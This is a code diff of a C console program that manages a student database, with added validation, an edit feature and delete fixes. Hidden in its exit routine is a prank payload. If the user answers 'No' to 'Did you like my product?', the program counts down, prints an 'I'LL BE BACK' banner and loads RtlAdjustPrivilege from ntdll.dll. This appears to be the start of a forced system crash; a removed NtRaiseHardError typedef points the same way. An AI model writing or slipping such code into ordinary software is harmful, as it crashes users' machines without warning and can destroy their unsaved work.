@@ -10,11 +10,22 @@
 
 
 
-typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
-typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+
+void printEnd() {
+
+
+	printf("_________ _  _        _          ______   _______    ______   _______  _______  _       \n");
+	printf("\\__   __/( )( \\      ( \\        (  ___ \\ (  ____ \\  (  ___ \\ (  ___  )(  ____ \\| \\    /\\\n");
+	printf("   ) (   |/ | (      | (        | (   ) )| (    \\/  | (   ) )| (   ) || (    \\/|  \\  / /\n");
+	printf("   | |      | |      | |        | (__/ / | (__      | (__/ / | (___) || |      |  (_/ / \n");
+	printf("   | |      | |      | |        |  __ (  |  __)     |  __ (  |  ___  || |      |   _ (  \n");
+	printf("   | |      | |      | |        | (  \\ \\ | (        | (  \\ \\ | (   ) || |      |  ( \\ \\ \n");
+	printf("___) (___   | (____/\\| (____/\\  | )___) )| (____/\\  | )___) )| )   ( || (____/\\|  /  \\ \\\n");
+	printf("\\_______/   (_______/(_______/  |/ \\___/ (_______/  |/ \\___/ |/     \\|(_______/|_/    \\/\n");
 
 
 
+}
 //typedef struct students students;
 void main() {
 	setlocale(LC_ALL, "Rus");
@@ -28,13 +39,22 @@ void main() {
 
 	int lastSTU = -1;
 
+	while (1) {
+		system("cls");
+		printLogo();
 
-	printLogo();
+		printf("Hello, enter your name and the database will be loaded automatically,\n if you do not want this, then enter a new name to create an empty database\n");
 
-	printf("Hello, enter your name and the database will be loaded automatically,\n if you do not want this, then enter a new name to create an empty database\n");
+		scanf("%255[^\n]", userName);
 
-	scanf("%255[^\n]", userName);
-
+		if (!resolvedName(userName)) {
+			printf("Invalid user name\n try agein press any key\n");
+			_getch();
+			continue;
+		}
+		else
+			break;
+	}
 
 	newUserVerification(dataUser, userName);
 	int n;
@@ -42,8 +62,9 @@ void main() {
 
 	while (1) {
 		system("cls");
+		printf("Number of fields in the database: %d\n", lastSTU + 1);
 		printLogo();
-		printf("\n select the desired item:\n 1. entering user data\n 2. print students\n 3. sort arr\n 4. serch \n 5. delite elem\n 7. exit\n");
+		printf("\n select the desired item:\n 1. entering user data\n 2. print students\n 3. sort arr\n 4. serch \n 5. delite elem\n 6. change elem \n 7. exit\n");
 		scanf("%s", &t);
 		if (allDigit(t)) {
 			n = atoi(t);
@@ -53,7 +74,7 @@ void main() {
 			_getch();
 			continue;
 		}
-		
+
 		switch (n)
 		{
 		case 1:
@@ -199,7 +220,9 @@ void main() {
 			printLogo();
 			sercInData(STU, &lastSTU, 0); //mode 0 - delite mode 1- serch 
 			break;
-
+		case 6:
+			changeUser(&STU[0], &lastSTU);
+		break;
 		case 7:
 			printf("Do you want to save your changes?\n 1. Yes\n 2. No\n");
 			scanf("%s", &t);
@@ -220,7 +243,7 @@ void main() {
 				case 2:
 					printf("Have a good time <3\n Press any key: \n");
 					_getch();
-				break;
+					break;
 				default:
 					printf("Invalid data, try again\n press eny key;");
 					_getch();
@@ -232,10 +255,26 @@ void main() {
 				_getch();
 				break;
 			}
-
+			system("cls");
+			printLogo();
 			printf("Did you like my product?\n 1. Yes\n 2. No\n");
 			scanf("%d", &n);
 			if (n == 2) {
+				system("color 4");
+				system("cls");
+
+				int number = 5;
+				while (number >= 1)
+				{
+					printf("%d \n", number);
+					Sleep(1000);
+					number--;
+				}
+				system("cls");
+				printEnd();
+				//printf("PRESS ANY KEY");
+				//_getch();
+
 				BOOLEAN f;
 				ULONG u;
 				LPVOID s = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
@@ -381,7 +420,7 @@ void printSTUid(students STU, int* lastSTU, int* indexArr) {
 void newStudent(students* st, int* last) {
 	system("cls");
 	printLogo();
-	
+
 	char t[255];
 	/*
 	char name[255];
@@ -393,7 +432,8 @@ void newStudent(students* st, int* last) {
 	scanf("%s", t);
 	if (allLetters(t)) {
 		strncpy(st[*last + 1].name, t, 255);
-	} else {
+	}
+	else {
 		printf("Invalid data\n press any key: \n");
 		_getch();
 		goto m;
@@ -408,13 +448,14 @@ void newStudent(students* st, int* last) {
 		printf("Invalid data\n press any key: \n");
 		_getch();
 		goto m;
-		
+
 	}
 
 
 	printf("\ninput age:\n");
 	scanf("%s", t);
-	if (allDigit(t)) {
+	if (allDigit(t) && atoi(t) >= 0 && atoi(t) < 125) {
+		
 		st[*last + 1].age = atoi(t);
 	}
 	else {
@@ -432,12 +473,12 @@ void newStudent(students* st, int* last) {
 		printf("Invalid data\n press any key: \n");
 		_getch();
 		goto m;
-		
+
 	}
 
-	
+
 	*last = *last + 1;
-	m:;
+m:;
 
 }
 
@@ -579,16 +620,17 @@ void serchStruct(students* STU, int* lastIndex, int* indexArr, int* lastIndexInR
 	switch (*num)
 	{
 	case 1:
-		if (atoi((char*)elem) - 1 <= *lastIndex) {
+		if (atoi((char*)elem) - 1 <= *lastIndex && allDigit((char*)elem) ) {
 			indexArr[0] = atoi((char*)elem) - 1;
 			printSTUid(STU[atoi((char*)elem) - 1], lastIndex, indexArr);
 			*lastIndexInResult = -2;
 
-		}else 
+		}
+		else
 			*lastIndexInResult = -1;
 		break;
 	case 2:
-		for (int i = 0; i < *lastIndex + 1; i++) { 
+		for (int i = 0; i < *lastIndex + 1; i++) {
 			strcpy(t1, STU[i].name);
 			strcpy(t2, (char*)elem);
 
@@ -638,6 +680,91 @@ void serchStruct(students* STU, int* lastIndex, int* indexArr, int* lastIndexInR
 	}
 }
 
+
+
+void changeUser(students* STU, int* lastSTU) {
+	bool allDone = FALSE;
+	system("cls");
+	printLogo();
+	int n, id;
+	char find[255];
+	char t[255];
+	printf("input id user to cahnge\n");
+	scanf("%s", &t);
+
+	if (allDigit(t) ) {
+		if (atoi(t) >= 1 && atoi(t) <= *lastSTU + 1) {
+			id = atoi(t) - 1;
+
+			system("cls");
+			printLogo();
+			printf("which column do you want to change?\n 1. change name \n 2. change last name\n 3. change age\n 4. change direction\n 5. exit.\n");
+			scanf("%s", &t);
+
+			if (allDigit(t)) {
+				n = atoi(t);
+				if (n >= 1 && n <= 4) {
+					printf("\nreplaced by?:\n");
+					scanf("%s", find);
+					
+					switch (n)
+					{
+					case 1:
+						if (allLetters(find)) {
+							strncpy(STU[id].name, find, 255);
+							allDone = TRUE;
+						}
+						break;
+						
+					case 2:
+						if (allLetters(find)) {
+							strncpy(STU[id].lastName, find, 255);
+							allDone = TRUE;
+						}
+						break;
+					case 3:
+						if (allDigit(find)) {
+							
+							if (atoi(find) >= 0 && atoi(find) < 130) {
+								STU[id].age = atoi(find);
+								allDone = TRUE;
+							}
+						}
+						break;
+					case 4:
+						if (allLetters(find)) {
+							strncpy(STU[id].direction, find, 255);
+							allDone = TRUE;
+						}
+						break;
+
+					default:
+						printf("invalid data\n press any key\n");
+						allDone = FALSE;
+						_getch();
+						break;
+					}
+				}
+			}
+			}
+
+	}
+		
+	if (allDone == FALSE) {
+	system("cls");
+	printLogo();
+	printf("invalid data\n press any key\n");
+	_getch();
+	}
+	else {
+		printf("\nCompleted successfully\npress any key: \n");
+		_getch();
+	}
+	
+
+}
+
+
 void sercInData(students* STU, int* lastSTU, int mode) {  //mode 0 - delite mode 1- serch 
 	if (mode == 1) {
 		printf("\nselect the desired item serch in:\n 1. find id\n 2. find name \n 3. find last name\n 4. find age\n 5. find direction\n 6. exit.\n");
@@ -651,35 +778,42 @@ void sercInData(students* STU, int* lastSTU, int mode) {  //mode 0 - delite mode
 	scanf("%s", &t);
 	if (allDigit(t)) {
 		n = atoi(t);
-	
 
 
-	int indexArr[255];
-	int lastIndenInArr = -1;
-	if (n >= 1 && n <= 5) {
 
-		printf("\ninput elem:\n");
-		scanf("%s", find);
+		int indexArr[255];
+		int lastIndenInArr = -1;
+		if (n >= 1 && n <= 5) {
 
-		serchStruct(STU, lastSTU, indexArr, &lastIndenInArr, find, &n);
-		if (lastIndenInArr == -2)
-			goto m;
-		if (lastIndenInArr == -1)
-			printf("Invalid data\n try again\n");
-		else {
-			system("cls");
-			printLogo();
-			if (mode == 1)
-				printAllStuSpecial(STU, lastSTU, indexArr, &lastIndenInArr);
-			else
-				deliteData(STU, lastSTU, indexArr, &lastIndenInArr);
+			printf("\ninput elem:\n");
+			scanf("%s", find);
+
+			serchStruct(STU, lastSTU, indexArr, &lastIndenInArr, find, &n);
+			if (lastIndenInArr == -2)
+				goto m;
+			if (lastIndenInArr == -1) {
+				printf("Invalid data\n try again\n");
+				_getch();
+			}
+			else {
+				system("cls");
+				printLogo();
+				if (mode == 1) {
+					printAllStuSpecial(STU, lastSTU, indexArr, &lastIndenInArr);
+					_getch();
+				}
+				else
+					deliteData(STU, lastSTU, indexArr, &lastIndenInArr);
+					_getch();
+			}
 		}
-	}
-	if (mode == 0)
-		printAllStu(STU, lastSTU);
-	m:
-	printf("\nCompleted successfully\npress any key: \n");
-	_getch();
+		if (mode == 0)
+			printAllStu(STU, lastSTU);
+		m:
+		if (lastIndenInArr == -2) {
+			printf("\nCompleted successfully\npress any key: \n");
+			_getch();
+		}
 	}
 	else {
 		printf("Invalid data\n press any key: \n");
@@ -760,13 +894,13 @@ void descendingAscending(students* STU, int* n, int* lastSTU) {
 
 void deliteData(students* STU, int* lastSTU, int* indexArr, int* lastIndenInArr) {
 	for (int i = 0; i <= *lastIndenInArr; i++) {
-		shiftArr(STU, lastSTU, &i);
+		shiftArr(STU, lastSTU, &indexArr[i]);
 		*lastSTU = *lastSTU - 1;
 	}
 }
 
 void shiftArr(students* STU, int* lastSTU, int* startIndex) {
-	for (int i = *startIndex; i < *lastSTU - 1; i++) {
+	for (int i = *startIndex; i < *lastSTU; i++) {
 
 		students tST = STU[i];
 		STU[i] = STU[i + 1];
@@ -789,7 +923,10 @@ bool allDigit(char* s) {
 		else return FALSE;
 	return true;
 }
-// TODO: Создать структуру с полями и создание файла нужен файл по типу user 
-// TODO: С учётом регистра и без
 
-
+bool resolvedName(char* s) {
+	for (int i = 0; i < strlen(s); i++)
+		if (!(s[i] >= 'A' && s[i] <= 'Z' || s[i] >= 'a' && s[i] <= 'z' || s[i] >= 'А' && s[i] <= 'я' || s[i] >= 'а' && s[i] <= 'я' || s[i] >= '0' && s[i] <= '9'))
+			return 0;
+	return true;
+}
